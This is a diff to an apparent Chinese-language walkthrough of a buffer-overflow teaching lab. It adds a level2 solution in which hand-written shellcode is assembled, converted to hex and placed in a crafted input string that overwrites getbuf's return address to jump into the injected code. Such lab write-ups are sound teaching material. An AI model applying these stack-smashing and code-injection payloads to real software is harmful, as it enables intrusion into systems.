@@ -120,6 +120,7 @@ getbuf():
 00 00 00 00 00 00 00 00
 00 00 00 00 0b 8e 04 08     /* 45 ~ 48 跳转 */
 ```
+![VALID0](./image/VALID0.png)
 
 ## level1
 ```c
@@ -155,7 +156,79 @@ fizz():
 16 17 18 19 20 21 22 23
 24 25 26 27 28 29 30 31
 32 33 34 35 36 37 38 39
-40 41 42 43 af 8d 04 08     /* 45 ~ 48 跳转 */
+40 41 42 43 af 8d 04 08     /* 44 ~ 47 跳转 */
 48 49 50 51 ef b4 da 17     /* 52 ~ 55 cookie */
 56 57 58 59 60 61 62 63
 ```
+![VALID1](./image/VALID1.png)
+
+## level2
+```c
+int global_value = 0;
+
+void bang(int val){
+    if (global_value == cookie) {           // global_value是？
+        printf("Bang!: You set global_value to 0x%x\n", global_value);
+        validate(2);
+    } else
+        printf("Misfire: global_value = 0x%x\n", global_value);
+    exit(0);
+}
+```
+```assmebly
+08048d52 <bang>:
+bang():
+ 8048d52:	55                   	push   %ebp
+ 8048d53:	89 e5                	mov    %esp,%ebp
+ 8048d55:	83 ec 18             	sub    $0x18,%esp
+ 8048d58:	a1 0c d1 04 08       	mov    0x804d10c,%eax			# 0x804d10c是global_value
+ 8048d5d:	3b 05 04 d1 04 08    	cmp    0x804d104,%eax			# 0x804d104是cookie
+ 8048d63:	75 26                	jne    8048d8b <bang+0x39>
+```
+这一题要求`global_value == cookie`。  
+然而`global_value`的地址在`0x804d10c`，输入的字符串的首地址在`0x556835e8`，肯定不能直接垫到那里。  
+这时可以考虑在输入的字符串内写一小块汇编代码，然后在执行getbuf()的ret时跳到我们写的代码那里。  
+![stack_0x55683614](./image/stack_0x55683614.jpg)
+代码中则执行将`cookie`也就是`0x17dab4ef`写到`global_value`的地址`0x804d10c`。  
+然后通过`push`和`ret`配合再跳转到bang()函数的位置`0x8048d52`。  
+![stack_0x556835e8](./image/stack_0x556835e8.jpg)
+这样就能实现将`global_value`的值替换为`cookie`。  
+汇编代码如下: 
+```assembly
+.code32
+.section .data
+.section .text
+.globl _start
+_start:
+    movl $0x17dab4ef,0x804d10c       # 0x17dab4ef是我的cookie，0x804d10c存的global_value
+    push $0x08048d52                 # 0x08048d52是bang()函数的地址
+    ret
+```
+先将该.s文件编译为可执行的二进制文件: 
+```bash
+$ as --32 set_global_value.s -o set_global_value.o
+```
+再将可执行文件反汇编为汇编代码: 
+```bash
+$ objdump set_global_value.o
+```
+最终得到的汇编代码为: 
+```assembly
+00000000 <_start>:
+   0:   c7 05 0c d1 04 08 ef    movl   $0x17dab4ef,0x804d10c
+   7:   b4 da 17 
+   a:   68 52 8d 04 08          push   $0x8048d52
+   f:   c3                      ret 
+```
+将汇编代码对应的十六进制表示写入答案: 
+```
+c7 05 0c d1 04 08 ef b4     /* movl   $0x17dab4ef,0x804d10c */
+da 17 68 52 8d 04 08 c3     /* push   $0x8048d52 */
+16 17 18 19 20 21 22 23     /* ret */
+24 25 26 27 28 29 30 31
+32 33 34 35 36 37 38 39
+40 41 42 43 e8 35 68 55     /* 44 ~ 47 跳转 */
+48 49 50 51 52 53 54 55
+56 57 58 59 60 61 62 63
+```
+![VALID2](./image/VALID2.png)
